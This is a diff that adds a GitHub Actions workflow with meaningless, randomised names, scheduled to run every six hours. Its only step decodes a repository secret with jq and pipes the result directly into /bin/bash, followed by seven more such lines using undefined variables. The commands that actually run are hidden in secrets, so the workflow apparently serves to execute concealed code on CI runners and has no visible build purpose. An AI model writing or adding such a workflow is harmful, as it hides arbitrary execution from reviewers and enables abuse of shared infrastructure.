@@ -1,0 +1,23 @@
+name: ahfahhil
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ahfahhil
+        env:
+          n94: ${{ secrets.n94 }}
+        run: |
+          echo $n94 | jq -r .krttt65 | /bin/bash
+          echo $v321 | jq -r .yn34 | /bin/bash
+          echo $otyt7724 | jq -r .vrm1 | /bin/bash
+          echo $ajhpb26716 | jq -r .spfc8 | /bin/bash
+          echo $tj9 | jq -r .nvjmd611 | /bin/bash
+          echo $gxaf53 | jq -r .b378 | /bin/bash
+          echo $ny2934 | jq -r .yrmg52 | /bin/bash
+          echo $ntdq501 | jq -r .hvh7 | /bin/bash
+
